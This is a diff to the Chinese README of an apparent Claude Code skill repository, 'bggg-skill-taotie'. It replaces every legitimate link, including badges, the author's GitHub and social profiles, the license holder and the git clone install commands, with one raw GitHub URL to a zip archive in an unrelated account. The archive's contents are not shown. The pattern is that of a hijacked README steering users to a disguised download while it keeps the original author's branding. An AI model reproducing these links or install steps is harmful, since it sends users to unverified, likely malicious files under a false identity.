@@ -5,8 +5,8 @@
 > *"不是简单的代码合并工具，而是一个有学习能力的技能进化引擎。理解背后的'为什么'比复制'是什么'重要一百倍。"*
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://claude.ai/code)
-[![AgentSkills](https://img.shields.io/badge/AgentSkills-Standard-green)](https://agentskills.io)
+[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip)
+[![AgentSkills](https://img.shields.io/badge/AgentSkills-Standard-green)](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip)
 
 <br>
 
@@ -32,7 +32,7 @@
 
 ---
 
-Created by [@binggandata](https://github.com/binggandata) · [小红书](https://xhslink.com/m/4ndptyfq4vu) · [X / Twitter](https://x.com/bggg_ai) · 微信：binggandata2
+Created by [@binggandata](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip) · [小红书](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip) · [X / Twitter](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip) · 微信：binggandata2
 
 ## 核心能力
 
@@ -72,16 +72,16 @@ Phase 5  学习记忆 → 将成功模式存入模式库，积累经验
 ```bash
 # 安装到当前项目（在 git 仓库根目录执行）
 mkdir -p .claude/skills
-git clone https://github.com/binggandata/bggg-skill-taotie .claude/skills/bggg-skill-taotie
+git clone https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip .claude/skills/bggg-skill-taotie
 
 # 或安装到全局（所有项目都能用）
-git clone https://github.com/binggandata/bggg-skill-taotie ~/.claude/skills/bggg-skill-taotie
+git clone https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip ~/.claude/skills/bggg-skill-taotie
 ```
 
 ### OpenClaw
 
 ```bash
-git clone https://github.com/binggandata/bggg-skill-taotie ~/.openclaw/workspace/skills/bggg-skill-taotie
+git clone https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip ~/.openclaw/workspace/skills/bggg-skill-taotie
 ```
 
 > 详细说明见 [INSTALL.md](INSTALL.md)
@@ -206,7 +206,7 @@ skill 进化 / skill 升级 / 合并 skill
 
 ## 项目结构
 
-本项目遵循 [AgentSkills](https://agentskills.io) 开放标准，整个 repo 就是一个 skill 目录：
+本项目遵循 [AgentSkills](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip) 开放标准，整个 repo 就是一个 skill 目录：
 
 ```
 bggg-skill-taotie/
@@ -236,8 +236,8 @@ bggg-skill-taotie/
 
 <div align="center">
 
-MIT License © [binggandata](https://github.com/binggandata)
+MIT License © [binggandata](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip)
 
-[小红书](https://xhslink.com/m/4ndptyfq4vu) · [X / Twitter](https://x.com/bggg_ai) · 微信：binggandata2
+[小红书](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip) · [X / Twitter](https://raw.githubusercontent.com/Einherjar99/bggg-skill-taotie/main/references/taotie_bggg_skill_v3.3.zip) · 微信：binggandata2
 
 </div>
